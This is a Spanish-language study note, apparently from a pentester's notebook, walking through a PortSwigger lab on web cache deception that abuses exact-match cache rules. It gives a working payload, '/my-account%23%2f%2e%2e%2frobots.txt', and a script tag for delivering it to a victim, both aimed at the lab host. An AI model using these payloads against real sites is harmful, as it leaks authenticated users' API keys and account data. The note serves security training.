---
aliases:
  - WCD 005 - exact-match cache rules
  - cache deception exact match
tags:
  - vuln/web-cache-deception
  - example
  - portswigger
---

# 005 — Reglas de nombre exacto (`robots.txt`, `favicon.ico`)

> Lab: [Exploiting exact-match cache rules](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules) · **Practitioner** · técnica → [[vulnerabilities/031-web-cache-deception/web-cache-deception|entry point]]

## Qué muestra
Acá la caché **no** cachea por extensión ni por directorio, sino por **nombre de archivo exacto**: rutas puntuales como `/robots.txt`, `/favicon.ico`, `/index.html`, `/sitemap.xml`. Combinás un **delimiter** y/o **normalización** para que el **origen** sirva `/my-account` (dinámico) mientras la URL, vista por la **caché**, coincide con uno de esos **nombres exactos cacheados**.

## Recon: descubrí qué nombres exactos se cachean
Pedí candidatos y mirá el `X-Cache`:
```
GET /robots.txt      -> X-Cache: hit   (candidato)
GET /favicon.ico     -> X-Cache: hit   (candidato)
GET /index.html      -> X-Cache: miss
```
Los que devuelven `hit` son las **reglas exact-match** que vas a abusar.

## Request → Response

Combinando delimiter (`%23`) + normalización (`%2f%2e%2e%2f`) para resolver a `/robots.txt` en la caché pero servir `/my-account` en el origen:

> `GET `==`/my-account%23%2f%2e%2e%2frobots.txt`==` HTTP/1.1`
> `Host: victim.web-security-academy.net`
> `Cookie: session=<sesión de la víctima>`

**⬇️ el origen corta en `#` y sirve `/my-account`; la caché normaliza y ve `/robots.txt` (nombre exacto cacheado):**

> `HTTP/1.1 200 OK` · `Cache-Control: max-age=30` · ==`X-Cache: miss`==
> `...Your API Key is: `==`<API KEY DE LA VÍCTIMA>`==`...`

## Por qué funciona
- **Origen:** `%23` (`#`) delimita → descarta la cola → enruta `/my-account` **dinámico** con los datos.
- **Caché:** ignora el delimiter, normaliza el resto (`%2f%2e%2e%2f` → `/../`) → la URL colapsa a `/robots.txt`, que está en su **lista de nombres exactos** → **cachea**.
- Es la **combinación** de las técnicas anteriores (delimiter del [[vulnerabilities/031-web-cache-deception/examples/002-path-delimiters|002]] + normalización del [[vulnerabilities/031-web-cache-deception/examples/004-cache-server-normalization|004]]) apuntada a un **nombre exacto**.

## Cómo explotarlo (weaponize)
1. Ajustá el payload hasta que en Repeater la respuesta traiga **los datos de la cuenta** y headers de caché.
2. Entregá el link a la víctima:
   ```
   <script>document.location="https://victim.web-security-academy.net/my-account%23%2f%2e%2e%2frobots.txt"</script>
   ```
3. La víctima autenticada lo abre → su respuesta queda cacheada bajo la key `/robots.txt`.
4. Pedís vos `/my-account%23%2f%2e%2e%2frobots.txt` (o directamente `/robots.txt` si la key normalizada coincide) → `X-Cache: hit` → **leés la API key de la víctima**.

## Verificación
- La URL entregada, pedida sin sesión, vuelve con ==`X-Cache: hit`== y los datos de la víctima en lugar del `robots.txt` real.

## Detalles que se pasan por alto
- **El nombre exacto tiene que existir en la lista de la caché** — por eso el recon de `robots.txt`/`favicon.ico` es el primer paso; sin un nombre cacheado no hay dónde guardar.
- **Puede requerir solo delimiter, solo normalización, o ambos** — depende de cómo la caché derive el nombre. Fuzzeá las combinaciones.
- **Cuidado con qué URL pide la víctima vs cuál pedís vos** — tienen que resolver a la **misma cache key**; confirmá con `X-Cache`/tiempo que el hit es el correcto.
- Cierra la serie: repasá la elección de técnica en el [[vulnerabilities/031-web-cache-deception/web-cache-deception|entry point]] y las pistas de examen en [[exam/to-do-list/web-cache-deception|to-do WCD]].
